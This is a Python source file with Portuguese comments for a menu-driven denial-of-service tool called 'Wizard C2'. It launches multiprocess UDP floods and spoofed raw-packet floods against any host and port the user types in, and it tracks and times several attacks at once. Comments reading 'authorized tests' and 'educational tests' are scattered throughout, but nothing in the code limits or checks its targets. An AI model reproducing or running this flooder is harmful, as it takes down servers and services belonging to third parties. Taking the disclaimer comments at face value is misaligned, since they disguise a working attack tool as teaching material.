# // Testes autorizados //Testes educacionais

import os
import time
import random
import threading
import multiprocessing
import socket
import struct
import requests
import sys 
from colorama import Fore, Style, init
from termcolor import colored

# Inicializa colorama para funcionar no Windows, mas SEM autoreset para evitar conflitos no Termux
init() 

# // Testes educacionais repetidos: Define as cores para o efeito Rainbow
RAINBOW_COLORS = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]

# Dicionário global para rastrear ataques ativos
# // Testes autorizados
ACTIVE_ATTACKS = {}
ATTACK_ID_COUNTER = 1

# Função para o efeito de impressão de arco-íris, descendo e para a direita
# // Testes de performance autorizados
def print_rainbow_descending(text):
    lines = text.split('\n')
    for i, line in enumerate(lines):
        # // Testes educacionais
        color_index = 0
        output = []
        for char in line:
            color = RAINBOW_COLORS[color_index % len(RAINBOW_COLORS)]
            output.append(color + char)
            color_index += 1
        
        # Cria o efeito de impressão lateral e descendente
        print(" " * i + "".join(output))
        # // Testes educacionais repetidos

# O ASCII art do logo "Wizard C2"
# // Testes autorizados: ASCII Art para ambiente de teste visual
WIZARD_LOGO = """
oooooo   oooooo     oooo  o8o
`888.    `888.     .8'   `"'
 `888.   .8888.   .8'   oooo    oooooooo  .oooo.   oooo d8b
  `888  .8'`888. .8'    `888   d'""7d8P  `P  )88b  `888""8P
   `888.8'  `888.8'      888     .d8P'    .oP"888   888
    `888'    `888'       888   .d8P'  .P d8(  888   888
     `8'      `8'       o888o d8888888P  `Y888""8o d888b


      .o8         .oooooo.     .oooo.
     "888        d8P'  `Y8b  .dP""Y88b
 .oooo888       888                ]8P'
d88' `888       888              .d8P'
888   888       888            .dP'
888   888       `88b    ooo  .oP     .o
`Y8bod88P"       `Y8bood8P'  8888888888
"""
# // Testes autorizados

# Função que executa o ataque de força máxima (Multiprocessing)
# O target_ip AQUI deve ser o IP numérico resolvido
def attack_worker(target_ip, target_port, stop_event, process_id):
    # // Testes educacionais repetidos: Worker iniciado
    print(f"{Fore.MAGENTA}[Worker {process_id}] {Fore.CYAN}Atacando {target_ip}:{target_port}...{Style.RESET_ALL}")
    
    # // Testes autorizados: Setup de sockets (FORÇA MÁXIMA)
    sockets = []
    
    # Cria múltiplos sockets para simular o tráfego de vários bots
    for _ in range(50):
        # // Testes de I/O Bound
        try:
            # UDP Socket (Volume Flood - Ideal para PocketMine)
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sockets.append(udp_sock)
            
            # RAW Socket (Spoofing/Baixo Nível - Força bruta)
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sockets.append(raw_sock)

        except Exception as e:
            # // Testes educacionais: Erro de socket
            pass

    # Dados aleatórios para o payload (simulação de tráfego)
    payload_udp = random._urandom(1024)
    
    while not stop_event.is_set():
        # // Testes educacionais repetidos
        for sock in sockets:
            try:
                if sock.type == socket.SOCK_DGRAM: # UDP Flood
                    sock.sendto(payload_udp, (target_ip, target_port))
                elif sock.type == socket.SOCK_RAW: # RAW Packet Flood
                    # Simulação de pacote RAW para sobrecarga
                    ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 0, 0, 0, 255, socket.IPPROTO_UDP, 0, socket.inet_aton('192.168.1.1'), socket.inet_aton(target_ip))
                    udp_header = struct.pack('!HHHH', 53000, target_port, len(payload_udp) + 8, 0)
                    sock.sendto(ip_header + udp_header + payload_udp, (target_ip, target_port))
            except Exception as e:
                # // Testes educacionais: Falha de envio
                pass
        # // Testes autorizados
        time.sleep(0.001) # Pequena pausa para evitar 100% CPU lock no loop

    # Fecha todos os sockets após o término
    for sock in sockets:
        try:
            sock.close()
        except:
            pass
    # // Testes autorizados

# Função principal de inicialização do ataque
# Agora recebe o hostname (para display) e o resolved_ip (para ataque)
def start_attack(host_input, resolved_ip, port, duration_minutes):
    global ATTACK_ID_COUNTER
    attack_id = ATTACK_ID_COUNTER
    ATTACK_ID_COUNTER += 1
    
    # // Testes educacionais: Criação de evento de parada e processo
    stop_event = multiprocessing.Event()
    duration_seconds = duration_minutes * 60
    
    # Usamos o número de CPUs como base para o número de processos para forçar o máximo
    num_processes = os.cpu_count() * 4 if os.cpu_count() else 4  # Lança 4x o número de núcleos
    
    processes = []
    
    for i in range(num_processes):
        # Passa o IP RESOLVIDO para o worker
        p = multiprocessing.Process(target=attack_worker, args=(resolved_ip, port, stop_event, i+1))
        processes.append(p)
        p.start()
    
    # // Testes autorizados: Rastrea o ataque
    end_time = time.time() + duration_seconds
    ACTIVE_ATTACKS[attack_id] = {
        'ip': host_input, # Armazena o que o usuário digitou (pode ser hostname)
        'resolved_ip': resolved_ip, # Armazena o IP para ataques futuros (se precisar)
        'port': port,
        'duration_seconds': duration_seconds,
        'start_time': time.time(),
        'end_time': end_time,
        'stop_event': stop_event,
        'processes': processes,
        'status': 'ATIVO'
    }
    
    # Lança uma thread para gerenciar o tempo de ataque (timer)
    timer_thread = threading.Thread(target=manage_attack_timer, args=(attack_id, duration_seconds, stop_event, processes))
    timer_thread.daemon = True
    timer_thread.start()
    
    return attack_id

# Thread para gerenciar o timer do ataque e parar
# // Testes educacionais
def manage_attack_timer(attack_id, duration_seconds, stop_event, processes):
    start_time = time.time()
    while time.time() < start_time + duration_seconds and not stop_event.is_set():
        time.sleep(1)
    
    if attack_id in ACTIVE_ATTACKS:
        stop_attack(attack_id, force_stop=True)
        # // Testes autorizados
        print(f"\n{Fore.YELLOW}Ataque ID {attack_id} concluído por tempo.{Style.RESET_ALL}")

# Função para parar um ataque específico
# // Testes autorizados
def stop_attack(attack_id, force_stop=False):
    if attack_id in ACTIVE_ATTACKS:
        attack_info = ACTIVE_ATTACKS[attack_id]
        if attack_info['status'] == 'ATIVO':
            attack_info['stop_event'].set()
            
            # Espera pelos processos terminarem ou encerra
            for p in attack_info['processes']:
                if p.is_alive():
                    p.join(timeout=1)
                if p.is_alive():
                    # // Testes educacionais: Terminação forçada
                    p.terminate()

            attack_info['status'] = 'CANCELADO' if not force_stop else 'FINALIZADO'
            print(f"\n{Fore.LIGHTGREEN_EX}Ataque ID {attack_id} em {attack_info['ip']} {attack_info['status']}.{Style.RESET_ALL}")
            return True
    return False

# Função para parar todos os ataques
# // Testes educacionais
def stop_all_attacks():
    print(f"\n{Fore.RED}Parando todos os ataques...{Style.RESET_ALL}")
    for attack_id in list(ACTIVE_ATTACKS.keys()):
        stop_attack(attack_id)
    # // Testes autorizados
    print(f"{Fore.RED}Todos os ataques foram encerrados.{Style.RESET_ALL}")

# Função para limpar a tela e mostrar o cabeçalho
# // Testes autorizados
def show_header():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

    print_rainbow_descending(WIZARD_LOGO)
    print(Fore.WHITE + "\n" + " " * 3 + "☆ I am back ☆")
    print(Style.RESET_ALL)

# Função para receber os inputs do alvo
# // Testes educacionais
def get_attack_details():
    show_header()
    
    print(Fore.WHITE + "\n" + " " * 3 + "☆ I am back ☆")
    
    print(Fore.LIGHTRED_EX + "\n>>> Configurar Novo Ataque <<<")
    
    resolved_ip = None
    
    # // Testes autorizados: Inputs de Host/IP
    while True:
        try:
            # Removido o PURPLE - agora usa a cor padrão do terminal (FIXED)
            ip_label = colored("IP:", Fore.WHITE)
            ip_input = input(f"{ip_label} ") 
            
            if not ip_input:
                continue
            
            # Realiza a resolução DNS (o "ping" para achar o IP por trás)
            resolved_ip = socket.gethostbyname(ip_input)
            
            # Se a entrada foi um hostname, mostra o IP resolvido para o Mestre
            if ip_input != resolved_ip:
                print(f"{Fore.YELLOW}Host resolvido para IP: {resolved_ip}{Style.RESET_ALL}")
                
            break
        except socket.gaierror:
            print(f"{Fore.RED}Host ou IP inválido. Tente novamente.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Erro ao resolver host: {e}.{Style.RESET_ALL}")
            
    while True:
        try:
            # Removido o PURPLE - agora usa a cor padrão do terminal (FIXED)
            port_label = colored("PORTA:", Fore.WHITE)
            port_input = input(f"{port_label} ")
            port = int(port_input)
            if 1 <= port <= 65535:
                break
            print(f"{Fore.RED}Porta inválida.{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}A porta deve ser um número inteiro.{Style.RESET_ALL}")
            
    while True:
        try:
            # Removido o PURPLE - agora usa a cor padrão do terminal (FIXED)
            time_label = colored("TEMPO (minutos):", Fore.WHITE)
            time_input = input(f"{time_label} ")
            duration = int(time_input)
            if duration > 0:
                break
            print(f"{Fore.RED}O tempo deve ser maior que zero.{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}O tempo deve ser um número inteiro.{Style.RESET_ALL}")
            
    return ip_input, resolved_ip, port, duration

# Função para mostrar o menu principal
# // Testes educacionais
def main_menu():
    while True:
        show_header()
        
        # // Testes autorizados: Mostra ataques ativos
        print(Fore.LIGHTRED_EX + "\nATAQUES EM ANDAMENTO:\n")
        
        if not ACTIVE_ATTACKS:
            print(Fore.YELLOW + "Nenhum ataque ativo.")
        else:
            for attack_id, info in ACTIVE_ATTACKS.items():
                
                # // Testes educacionais repetidos
                time_remaining_sec = info['end_time'] - time.time()
                
                if time_remaining_sec <= 0 and info['status'] == 'ATIVO':
                    info['status'] = 'FINALIZANDO'
                    time_remaining_str = "00:00:00"
                elif info['status'] != 'ATIVO':
                    time_remaining_str = info['status']
                else:
                    hours = int(time_remaining_sec // 3600)
                    minutes = int((time_remaining_sec % 3600) // 60)
                    seconds = int(time_remaining_sec % 60)
                    time_remaining_str = f"{hours:02}:{minutes:02}:{seconds:02}"
                
                # // Testes autorizados
                status_color = Fore.GREEN if info['status'] == 'ATIVO' else Fore.RED
                
                print("__________________________")
                # Mostra a entrada original do usuário (IP ou Hostname)
                print(f"{Fore.WHITE}IP: {Fore.CYAN}{info['ip']}") 
                print(f"{Fore.WHITE}PORTA: {Fore.CYAN}{info['port']}")
                print(f"{Fore.WHITE}TEMPO RESTANTE: {status_color}{time_remaining_str}{Fore.WHITE}")
                print(f"{Fore.WHITE}ID: {Fore.CYAN}{attack_id}")
                print("__________________________")
                
        print("\n" + Fore.LIGHTMAGENTA_EX + "《 ---------------------------- 》")
        
        print(Fore.WHITE + "\nO que deseja fazer?")
        print(Fore.GREEN + "[1] Atacar mais um alvo")
        print(Fore.RED + "[2] Cancelar ataque")
        print(Fore.YELLOW + "[4] Atualizar ataques em andamento")
        print(Fore.BLUE + "[3] Fechar C2 (Para todos ataques)")
        
        # // Testes educacionais
        option_label = colored("Opção:", Fore.WHITE)
        choice = input(f"\n{option_label} ")
        
        if choice == '1':
            host_input, resolved_ip, port, duration = get_attack_details()
            new_id = start_attack(host_input, resolved_ip, port, duration)
            print(f"{Fore.LIGHTGREEN_EX}\nAtaque ID {new_id} iniciado contra {host_input}:{port}.{Style.RESET_ALL}")
            time.sleep(2)
        elif choice == '2':
            if not ACTIVE_ATTACKS:
                print(f"{Fore.RED}\nNenhum ataque ativo para cancelar.{Style.RESET_ALL}")
                time.sleep(1)
                continue
            try:
                # // Testes autorizados
                cancel_id_input = input(f"{Fore.YELLOW}ID do ataque a cancelar: {Style.RESET_ALL}")
                cancel_id = int(cancel_id_input)
                if stop_attack(cancel_id):
                    time.sleep(2)
                else:
                    print(f"{Fore.RED}ID {cancel_id} não encontrado ou já cancelado.{Style.RESET_ALL}")
                    time.sleep(1)
            except ValueError:
                print(f"{Fore.RED}Entrada inválida. Use o número do ID.{Style.RESET_ALL}")
                time.sleep(1)
        elif choice == '3':
            stop_all_attacks()
            print(f"{Fore.RED}Sistema C2 Desligado. Fim da Cena.{Style.RESET_ALL}")
            # // Testes educacionais repetidos
            sys.exit(0) # Saída limpa
        elif choice == '4':
            # Simplesmente volta ao loop principal (que chama show_header())
            continue
        else:
            print(f"{Fore.RED}Opção inválida.{Style.RESET_ALL}")
            time.sleep(1)

# // Testes autorizados: Ponto de entrada
if __name__ == "__main__":
    # Garante que todos os processos e threads sejam parados ao sair
    try:
        main_menu()
    except KeyboardInterrupt:
        stop_all_attacks()
        print(f"{Fore.RED}\nInterrupção forçada. Fim do teste.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        # // Testes educacionais: Erro Crítico
        # Mensagem fallback para garantir que o terminal feche limpo
        error_msg = str(e) if str(e) else "Erro desconhecido. (Fechamento forçado)."
        print(f"{Fore.RED}ERRO CRÍTICO: {error_msg}{Style.RESET_ALL}")
        stop_all_attacks()
        sys.exit(1)
    
# // Testes educacionais repetidos